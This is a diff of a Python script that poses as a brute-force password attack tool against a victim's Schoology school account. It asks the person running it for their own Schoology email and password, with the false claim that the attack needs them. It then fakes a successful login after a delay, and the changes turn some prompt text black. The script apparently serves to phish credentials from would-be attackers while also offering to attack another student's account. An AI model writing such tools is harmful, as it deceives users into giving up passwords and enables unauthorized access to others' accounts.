@@ -15,7 +15,7 @@ print('''
 \033[37m  \___________/__________|____|_|    |_________/_/
    
                tiktok jahsehrare
-               insta: spookyle4n
+               insta: spookyle4n\033[30m
 ''')
 e = input("[?] Your schoology email?: ")
 d = input("[?] Your schoology password? (bruteforce attack wont work without it): ")
@@ -23,7 +23,7 @@ print("attempting to log into schoology with...\033[1;3m " + e)
 time.sleep(4)
 print("\033[32msuccessfully logged in as " + e + " [\u2713]")
 
-c = input("[?] Victims schoology email?: ")
+c = input("\033[30m[?] Victims schoology email?: ")
 b = int(input("[?] How many passwords would you like to try?: "))
 a = input("[?] Start Attack? [y/n]: ")
 if a == 'y':
